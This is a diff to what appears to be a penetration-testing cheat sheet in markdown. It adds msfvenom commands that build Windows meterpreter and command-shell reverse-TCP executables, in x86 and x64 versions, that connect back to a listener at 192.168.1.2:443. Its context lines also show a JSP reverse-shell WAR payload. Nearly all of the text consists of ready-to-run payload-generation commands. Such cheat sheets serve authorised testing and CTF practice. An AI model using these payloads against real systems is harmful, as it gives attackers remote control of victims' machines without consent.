@@ -121,18 +121,24 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reve
 strings reverse.war | grep jsp # in order to get the name of the file
 ```
 
-# Reverse Shell (Metasploit Listener multi/handler)
+# Msfvenom Reverse Shell (Metasploit Listener multi/handler)
 
 ### Windows :
 
+### meterpreter
+
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
 ```
 
 ### or
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
+
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
 ```
 
 ### Linux :
